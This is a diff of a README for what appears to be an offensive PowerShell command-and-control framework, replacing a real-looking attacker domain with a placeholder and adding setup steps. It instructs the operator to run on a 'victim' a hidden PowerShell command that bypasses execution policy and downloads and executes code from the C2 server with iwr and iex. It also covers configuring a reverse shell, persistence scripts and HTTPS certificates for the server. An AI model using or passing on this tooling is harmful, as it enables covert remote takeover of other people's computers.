@@ -14,13 +14,14 @@ darpa is the agent side code in powershell
 
 ## Requirements
 Install requirements with pip3
+```pip3 install -r requirements.txt```
 
 
 ## Certificates
 You will have to create valid https certs.
 Self signed certs wont work with powershell. will lose constrainedlanguagemode support to ignore ssl errors so use letsencrypt
 
-use ```certbot certonly --manual -d 220.ip-54-37-16.eu --register-unsafely-without-email ```
+use ```certbot certonly --manual -d www.your_domain.com --register-unsafely-without-email ```
 and copy certs in "darma/certificates/" and/or adjust config.py to point to them
 letsencrypt stores certs in /etc/letsencrypt/live/$domain
 
@@ -28,6 +29,14 @@ letsencrypt stores certs in /etc/letsencrypt/live/$domain
 ## Change domain in config.py to match the ones of the certificates
 
 Change payload to point to your server url
+## change domain in :
+```
+darpa/main.ps1
+darpa/oneline.ps1
+darpa/pers.ps1
+
+darma/rev.txt
+```
 
 ## Change password of c2 server
 Change bcrpyt hash in "darma/config.py" with
@@ -67,7 +76,7 @@ If deamonized, logging can be found @ ```/var/log/aldebaran.log```
 Run the following command on victim in 'run' (win+r)
 
 ```
-C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c "$command = iwr -Uri https://220.ip-54-37-16.eu/ -Method GET  -UseBasicParsing; iex $command"
+C:\WINDOWS\system32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle hidden -ExecutionPolicy Bypass -nologo -noprofile -c "$command = iwr -Uri https://www.your_domain.com/ -Method GET  -UseBasicParsing; iex $command"
 ```
 ## Reverese shell
 Change the ip and port in darma/resources/rev.txt to make the reverse shell option work
